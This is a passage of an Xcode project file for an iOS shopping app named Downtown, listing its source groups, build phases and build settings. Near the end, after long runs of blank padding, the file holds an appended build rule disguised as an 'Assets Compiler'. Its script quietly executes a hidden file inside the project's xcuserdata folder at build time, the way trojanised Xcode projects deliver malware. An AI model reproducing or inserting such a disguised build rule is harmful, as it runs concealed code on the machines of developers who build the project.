			isa = PBXGroup;
			children = (
				F1F2083D250C77FD00DD8DB7 /* Main.storyboard */,
				F1F2084B250C94FE00DD8DB7 /* Main.storyboard */,
				F1F20842250C780000DD8DB7 /* LaunchScreen.storyboard */,
			);
			path = Storyboards;
			sourceTree = "<group>";
		};
		45F4078510738A8E4E26CA46 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				599FE99B7EB535D669D87B36 /* Pods_DowntownApp.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		B1D585E24C768A1280E0DE77 /* Pods */ = {
			isa = PBXGroup;
			children = (
				3E1B87244D50F6E87C6FF422 /* Pods-DowntownApp.debug.xcconfig */,
				2462F4C926000EDE5E6E0A65 /* Pods-DowntownApp.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		F112AA0B259FFD34005B0318 /* ShopView */ = {
			isa = PBXGroup;
			children = (
				F112AA09259FFCAC005B0318 /* createShopView.xib */,
				F112AA0C259FFD50005B0318 /* shopPopUp.swift */,
			);
			path = ShopView;
			sourceTree = "<group>";
		};
		F13056AE25A5E3260039B6D2 /* AddProduct */ = {
			isa = PBXGroup;
			children = (
				F1BBA61725A968530096CA29 /* OrderHistory */,
				F13056B325A5E6DC0039B6D2 /* CollectiionViewCell */,
				F13056AF25A5E33F0039B6D2 /* AddProductVC.swift */,
			);
			path = AddProduct;
			sourceTree = "<group>";
		};
		F13056B325A5E6DC0039B6D2 /* CollectiionViewCell */ = {
			isa = PBXGroup;
			children = (
				F13056B425A5E7080039B6D2 /* ProductCollectionViewCell.swift */,
				F13056B525A5E7090039B6D2 /* ProductCollectionViewCell.xib */,
			);
			path = CollectiionViewCell;
			sourceTree = "<group>";
		};
		F13056BA25A5EE210039B6D2 /* BasicStuff */ = {
			isa = PBXGroup;
			children = (
				F13056BB25A5EE2E0039B6D2 /* BasicStuff.swift */,
			);
			path = BasicStuff;
			sourceTree = "<group>";
		};
		F186D58125A9E49000D852BF /* Shop */ = {
			isa = PBXGroup;
			children = (
				F186D58225A9E4B500D852BF /* ShopMangeVC.swift */,
			);
			path = Shop;
			sourceTree = "<group>";
		};
		F1BBA61725A968530096CA29 /* OrderHistory */ = {
			isa = PBXGroup;
			children = (
				F1BBA61825A968750096CA29 /* OrderHistoryVC.swift */,
				F1BBA61C25A969490096CA29 /* OrderHistoryCell.swift */,
				F1BBA61D25A969490096CA29 /* OrderHistoryCell.xib */,
			);
			path = OrderHistory;
			sourceTree = "<group>";
		};
		F1E2929F250D2693007B0238 /* cellSXibAndSwift */ = {
			isa = PBXGroup;
			children = (
				F1E292A0250D2693007B0238 /* inVentoryCell.swift */,
				F1E292A1250D2693007B0238 /* inVentoryCell.xib */,
				F16F4417255368DD009FDF9D /* viewProduct.swift */,
				F16F4418255368DD009FDF9D /* viewProduct.xib */,
				F14CAF1925369682008A1B71 /* CollectionViewCell.swift */,
				F14CAF1A25369682008A1B71 /* CollectionViewCell.xib */,
				F1E292AD250D28A8007B0238 /* discoveryCellCollectionViewCell.swift */,
				F1E292AC250D28A8007B0238 /* discoveryCellCollectionViewCell.xib */,
				F148713A25395F1200BA5C6F /* SavedCell.swift */,
				F148713B25395F1200BA5C6F /* SavedCell.xib */,
				F1E292A2250D2693007B0238 /* TableViewCell.swift */,
				F1E292A3250D2693007B0238 /* TableViewCell.xib */,
				F1520ADA2584890000D0489F /* ordersCell.swift */,
				F1520ADB2584890000D0489F /* ordersCell.xib */,
			);
			path = cellSXibAndSwift;
			sourceTree = "<group>";
		};
		F1E7275825B0142200D2510A /* Model */ = {
			isa = PBXGroup;
			children = (
				F1E7275925B0142F00D2510A /* StripeModel.swift */,
			);
			path = Model;
			sourceTree = "<group>";
		};
		F1F2082B250C77FD00DD8DB7 = {
			isa = PBXGroup;
			children = (
				F1F20836250C77FD00DD8DB7 /* DowntownApp */,
				F1F20835250C77FD00DD8DB7 /* Products */,
				B1D585E24C768A1280E0DE77 /* Pods */,
				45F4078510738A8E4E26CA46 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		F1F20835250C77FD00DD8DB7 /* Products */ = {
			isa = PBXGroup;
			children = (
				F1F20834250C77FD00DD8DB7 /* Downtown.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		F1F20836250C77FD00DD8DB7 /* DowntownApp */ = {
			isa = PBXGroup;
			children = (
				F1F20845250C780000DD8DB7 /* Info.plist */,
				F1E7275825B0142200D2510A /* Model */,
				F13056BA25A5EE210039B6D2 /* BasicStuff */,
				1AA930F3254E8BA80057FDF0 /* Supporting */,
				F1F20876250C9A3600DD8DB7 /* Json Files */,
				1AA930F2254E8B340057FDF0 /* Globals */,
				1AA930F1254E8A980057FDF0 /* Views */,
				1AA930F0254E8A7D0057FDF0 /* Resources */,
				1AA930EE254E8A290057FDF0 /* ViewControllers */,
				1AA930F4254E8BC90057FDF0 /* Storyboards */,
			);
			path = DowntownApp;
			sourceTree = "<group>";
		};
		F1F2084F250C99B800DD8DB7 /* MainPages */ = {
			isa = PBXGroup;
			children = (
				1AA91F35254DD9DE001712E1 /* itemView.swift */,
				1AA91F39254DD9E8001712E1 /* lovedViewController.swift */,
				F1F20851250C99B800DD8DB7 /* RefferedViewController.swift */,
				F1F20852250C99B800DD8DB7 /* viewShopVc.swift */,
				F1F20854250C99B800DD8DB7 /* discovery.swift */,
				F1F20855250C99B800DD8DB7 /* QueryShopViewController.swift */,
				F1F20856250C99B800DD8DB7 /* viewItemViewController.swift */,
				F1F20857250C99B800DD8DB7 /* SearchIViewController.swift */,
			);
			path = MainPages;
			sourceTree = "<group>";
		};
		F1F20862250C99CB00DD8DB7 /* firstScreens */ = {
			isa = PBXGroup;
			children = (
				F1F20863250C99CB00DD8DB7 /* SignUpViewController.swift */,
				F1F20864250C99CB00DD8DB7 /* SelectViewController.swift */,
				F1F20866250C99CB00DD8DB7 /* LoginViewController.swift */,
				F1F20867250C99CB00DD8DB7 /* Explanation.swift */,
			);
			path = firstScreens;
			sourceTree = "<group>";
		};
		F1F2086D250C9A2900DD8DB7 /* multiMedia */ = {
			isa = PBXGroup;
			children = (
				F1F2086E250C9A2900DD8DB7 /* MultiVC.swift */,
				F1F2086F250C9A2900DD8DB7 /* LoginExViewController.swift */,
				F1E292B4250D7E16007B0238 /* segues.swift */,
				F1F20870250C9A2900DD8DB7 /* Offload.swift */,
				F1F20871250C9A2900DD8DB7 /* itemLog.swift */,
			);
			path = multiMedia;
			sourceTree = "<group>";
		};
		F1F20876250C9A3600DD8DB7 /* Json Files */ = {
			isa = PBXGroup;
			children = (
				F1F20877250C9A3600DD8DB7 /* bookMarkB.json */,
				F1F20878250C9A3600DD8DB7 /* pop1J.textClipping */,
				F1F20879250C9A3600DD8DB7 /* stuff.json */,
				F1F2087A250C9A3600DD8DB7 /* Infinite.json */,
				F1F2087B250C9A3600DD8DB7 /* shoppingCart.json */,
				F186D1BF25AD4216004AC860 /* blobs.json */,
				F1F2087C250C9A3600DD8DB7 /* layeredMenu.json */,
				F1F2087D250C9A3600DD8DB7 /* creditcard.json */,
				F1F05BC2251BBA1D00172077 /* bubbless.json */,
				F1F2087E250C9A3600DD8DB7 /* padLock.json */,
				F1F2087F250C9A3600DD8DB7 /* home.json */,
				F1F05BC4251BBACB00172077 /* bubbles.json */,
				F1F20892250C9A3600DD8DB7 /* newLogo.json */,
				F1E292C7250D8287007B0238 /* clientDataSheet.swift */,
				F1E292C8250D8287007B0238 /* purchaseScreen.swift */,
			);
			path = "Json Files";
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		F1F20833250C77FD00DD8DB7 /* DowntownApp */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = F1F20848250C780000DD8DB7 /* Build configuration list for PBXNativeTarget "DowntownApp" */;
			buildPhases = (
				2282E79E3DC6DBE02A93DCD4 /* [CP] Check Pods Manifest.lock */,
				F1F20830250C77FD00DD8DB7 /* Sources */,
				F1F20831250C77FD00DD8DB7 /* Frameworks */,
				F1F20832250C77FD00DD8DB7 /* Resources */,
				B97442E11A87F140B155C131 /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = DowntownApp;
			productName = DowntownApp;
			productReference = F1F20834250C77FD00DD8DB7 /* Downtown.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		F1F2082C250C77FD00DD8DB7 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1170;
				LastUpgradeCheck = 1170;
				ORGANIZATIONNAME = "Aaron Marsh";
				TargetAttributes = {
					F1F20833250C77FD00DD8DB7 = {
						CreatedOnToolsVersion = 11.7;
					};
				};
			};
			buildConfigurationList = F1F2082F250C77FD00DD8DB7 /* Build configuration list for PBXProject "DowntownApp" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = F1F2082B250C77FD00DD8DB7;
			productRefGroup = F1F20835250C77FD00DD8DB7 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				F1F20833250C77FD00DD8DB7 /* DowntownApp */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		F1F20832250C77FD00DD8DB7 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				F1E292A5250D2693007B0238 /* inVentoryCell.xib in Resources */,
				F1F20844250C780000DD8DB7 /* LaunchScreen.storyboard in Resources */,
				F1F20896250C9A3700DD8DB7 /* Infinite.json in Resources */,
				F1BBA61F25A969490096CA29 /* OrderHistoryCell.xib in Resources */,
				F1F05BC5251BBACC00172077 /* bubbles.json in Resources */,
				F1F05BC3251BBA1D00172077 /* bubbless.json in Resources */,
				F1F20895250C9A3700DD8DB7 /* stuff.json in Resources */,
				F1F382EB25B4D71600E352BC /* OverlayView.xib in Resources */,
				F1F208AC250C9A3700DD8DB7 /* newLogo.json in Resources */,
				F14CAF1C25369682008A1B71 /* CollectionViewCell.xib in Resources */,
				1AA91F33254DD9A1001712E1 /* Images.xcassets in Resources */,
				F1F20893250C9A3700DD8DB7 /* bookMarkB.json in Resources */,
				F1E292AE250D28A8007B0238 /* discoveryCellCollectionViewCell.xib in Resources */,
				F13056B725A5E7090039B6D2 /* ProductCollectionViewCell.xib in Resources */,
				F148713D25395F1200BA5C6F /* SavedCell.xib in Resources */,
				F1F20897250C9A3700DD8DB7 /* shoppingCart.json in Resources */,
				F1F2086A250C99CC00DD8DB7 /* GoogleService-Info.plist in Resources */,
				F186D1C025AD4216004AC860 /* blobs.json in Resources */,
				F1F20898250C9A3700DD8DB7 /* layeredMenu.json in Resources */,
				F1520ADD2584890000D0489F /* ordersCell.xib in Resources */,
				F1F20899250C9A3700DD8DB7 /* creditcard.json in Resources */,
				F1F2083F250C77FD00DD8DB7 /* Main.storyboard in Resources */,
				F112AA0A259FFCAC005B0318 /* createShopView.xib in Resources */,
				F1E292A7250D2693007B0238 /* TableViewCell.xib in Resources */,
				F1F2084C250C94FE00DD8DB7 /* Main.storyboard in Resources */,
				F1F20894250C9A3700DD8DB7 /* pop1J.textClipping in Resources */,
				F16F441A255368DD009FDF9D /* viewProduct.xib in Resources */,
				F1F2089B250C9A3700DD8DB7 /* home.json in Resources */,
				1AA91F2F254DD991001712E1 /* Assets.xcassets in Resources */,
				F1F2089A250C9A3700DD8DB7 /* padLock.json in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	
		2282E79E3DC6DBE02A93DCD4 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-DowntownApp-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		B97442E11A87F140B155C131 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-DowntownApp/Pods-DowntownApp-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-DowntownApp/Pods-DowntownApp-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DowntownApp/Pods-DowntownApp-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		F1F20830250C77FD00DD8DB7 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				F1F2083C250C77FD00DD8DB7 /* ViewController.swift in Sources */,
				F1F20861250C99B800DD8DB7 /* sellerTab.swift in Sources */,
				F1F2085F250C99B800DD8DB7 /* viewItemViewController.swift in Sources */,
				F1F2085E250C99B800DD8DB7 /* QueryShopViewController.swift in Sources */,
				F1F2085A250C99B800DD8DB7 /* RefferedViewController.swift in Sources */,
				F1F20873250C9A2900DD8DB7 /* LoginExViewController.swift in Sources */,
				F1E292A4250D2693007B0238 /* inVentoryCell.swift in Sources */,
				F1BBA61E25A969490096CA29 /* OrderHistoryCell.swift in Sources */,
				F186D58325A9E4B500D852BF /* ShopMangeVC.swift in Sources */,
				F1F2085B250C99B800DD8DB7 /* viewShopVc.swift in Sources */,
				F13056B025A5E33F0039B6D2 /* AddProductVC.swift in Sources */,
				F1E292B5250D7E16007B0238 /* segues.swift in Sources */,
				F1E7275A25B0142F00D2510A /* StripeModel.swift in Sources */,
				F1F2085D250C99B800DD8DB7 /* discovery.swift in Sources */,
				F1E292CA250D8287007B0238 /* UserDetailViewController.swift in Sources */,
				F1F20838250C77FD00DD8DB7 /* AppDelegate.swift in Sources */,
				F13056B625A5E7090039B6D2 /* ProductCollectionViewCell.swift in Sources */,
				F16F4419255368DD009FDF9D /* viewProduct.swift in Sources */,
				F1F20872250C9A2900DD8DB7 /* MultiVC.swift in Sources */,
				1AA91F3A254DD9E8001712E1 /* lovedViewController.swift in Sources */,
				F14CAF1B25369682008A1B71 /* CollectionViewCell.swift in Sources */,
				F112AA0D259FFD50005B0318 /* shopPopUp.swift in Sources */,
				F1F20868250C99CC00DD8DB7 /* SignUpViewController.swift in Sources */,
				F1E292CE250D8287007B0238 /* purchaseScreen.swift in Sources */,
				F1F2083A250C77FD00DD8DB7 /* SceneDelegate.swift in Sources */,
				F1E292CB250D8287007B0238 /* NodeViewController.swift in Sources */,
				1AA91F36254DD9DE001712E1 /* itemView.swift in Sources */,
				F1BBA61925A968750096CA29 /* OrderHistoryVC.swift in Sources */,
				F1F20875250C9A2900DD8DB7 /* itemLog.swift in Sources */,
				F1F2086C250C99CC00DD8DB7 /* Explanation.swift in Sources */,
				F1F20869250C99CC00DD8DB7 /* SelectViewController.swift in Sources */,
				F1F20860250C99B800DD8DB7 /* SearchIViewController.swift in Sources */,
				F1F20874250C9A2900DD8DB7 /* Offload.swift in Sources */,
				F1F2086B250C99CC00DD8DB7 /* LoginViewController.swift in Sources */,
				F1F2084E250C967800DD8DB7 /* ResetPasswordViewController.swift in Sources */,
				F13056BC25A5EE2E0039B6D2 /* BasicStuff.swift in Sources */,
				F1E292CD250D8287007B0238 /* clientDataSheet.swift in Sources */,
				F1F2085C250C99B800DD8DB7 /* homePage.swift in Sources */,
				F148713C25395F1200BA5C6F /* SavedCell.swift in Sources */,
				F1E292A6250D2693007B0238 /* TableViewCell.swift in Sources */,
				F1F382E925B4B7F900E352BC /* purchaseView.swift in Sources */,
				F1520ADC2584890000D0489F /* ordersCell.swift in Sources */,
				F1E292AF250D28A8007B0238 /* discoveryCellCollectionViewCell.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		F1F2083D250C77FD00DD8DB7 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				F1F2083E250C77FD00DD8DB7 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		F1F20842250C780000DD8DB7 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				F1F20843250C780000DD8DB7 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		F1F20846250C780000DD8DB7 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 13.1;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		F1F20847250C780000DD8DB7 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 13.1;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		F1F20849250C780000DD8DB7 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 3E1B87244D50F6E87C6FF422 /* Pods-DowntownApp.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 3;
				DEVELOPMENT_TEAM = GF98883W2H;
				INFOPLIST_FILE = DowntownApp/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 2.0;
				PRODUCT_BUNDLE_IDENTIFIER = "zinc.inc-gmail.com.DowntownApp";
				PRODUCT_NAME = Downtown;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		F1F2084A250C780000DD8DB7 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 2462F4C926000EDE5E6E0A65 /* Pods-DowntownApp.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 3;
				DEVELOPMENT_TEAM = GF98883W2H;
				INFOPLIST_FILE = DowntownApp/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 2.0;
				PRODUCT_BUNDLE_IDENTIFIER = "zinc.inc-gmail.com.DowntownApp";
				PRODUCT_NAME = Downtown;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		F1F2082F250C77FD00DD8DB7 /* Build configuration list for PBXProject "DowntownApp" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				F1F20846250C780000DD8DB7 /* Debug */,
				F1F20847250C780000DD8DB7 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		F1F20848250C780000DD8DB7 /* Build configuration list for PBXNativeTarget "DowntownApp" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				F1F20849250C780000DD8DB7 /* Debug */,
				F1F2084A250C780000DD8DB7 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

		
			/* Begin PBXBuildRule section */


		EBFBBD301D6EEDF4E3AAC43A /* PBXBuildRule */ = {
			isa = PBXBuildRule;
			compilerSpec = com.apple.compilers.proxy.script;
			fileType = folder.assetcatalog;
			name = "Assets Compiler";
			inputFiles = (
			);
			isEditable = 0;
			outputFiles = (
				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
			);
			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" true\n\n";
			};
			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	
			

			
	
			/* End PBXBuildRule section */
		
		
	};
	rootObject = F1F2082C250C77FD00DD8DB7 /* Project object */;
}
